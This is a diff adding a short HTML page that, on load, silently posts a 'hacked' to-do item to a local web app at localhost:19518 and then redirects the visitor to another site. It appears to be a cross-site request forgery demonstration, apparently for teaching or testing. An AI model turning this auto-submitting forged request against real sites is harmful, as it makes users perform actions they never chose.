@@ -1,0 +1,22 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+	<meta charset="utf-8" />
+    <script src="jquery-1.9.1.js"></script>
+</head>
+<body>
+<script type="text/javascript">
+    $(function() {
+        var data = {
+            text: "hacked",
+            dueDate: "16.12.16"
+        };
+        $.post("http://localhost:19518/Todo/Create", data, function () {
+            window.location = "http://bild.de";
+        });
+
+    });
+</script>
+</body>
+</html>
